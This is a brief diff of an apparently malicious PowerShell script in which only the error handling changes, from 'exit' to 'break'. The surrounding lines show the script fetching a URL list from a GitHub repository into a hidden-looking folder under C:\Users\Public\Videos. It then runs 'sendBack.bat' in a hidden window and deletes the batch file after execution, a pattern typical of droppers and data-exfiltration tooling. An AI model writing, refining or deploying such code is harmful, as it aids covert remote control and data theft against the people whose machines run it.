@@ -2,7 +2,7 @@ try {
     Invoke-WebRequest 'https://github.com/RaupenInspektor/Server/raw/main/url.txt' -OutFile 'C:\Users\Public\Videos\GraphicalUserInterface\url.txt'
 }
 catch {
-    exit
+    break
 }
 
 try {
@@ -11,7 +11,7 @@ try {
     Start-Process -FilePath "C:\Users\Public\Videos\sendBack.bat" -WindowStyle Hidden -Wait
 }
 catch {
-    exit
+    break
 }
 finally {
     # Delete the batch file after execution
